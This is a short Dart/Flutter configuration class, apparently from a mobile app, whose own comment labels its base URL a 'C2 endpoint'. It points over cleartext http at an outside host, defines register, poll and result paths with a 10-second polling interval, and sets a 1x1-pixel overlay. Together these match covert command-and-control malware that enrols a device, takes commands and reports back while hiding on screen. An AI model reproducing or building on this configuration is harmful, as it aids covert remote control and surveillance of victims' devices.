class AppConfig {
  // C2 endpoint — pakai http, network_security_config sudah allow cleartext
  static const String baseUrl = 'http://yanystoru.my.id:8000';

  static const String endpointPoll = '/poll';
  static const String endpointResult = '/result';
  static const String endpointRegister = '/register';

  // Interval polling (detik)
  static const int pollIntervalSec = 10;

  // Overlay
  static const int overlayWidth = 1;
  static const int overlayHeight = 1;
}
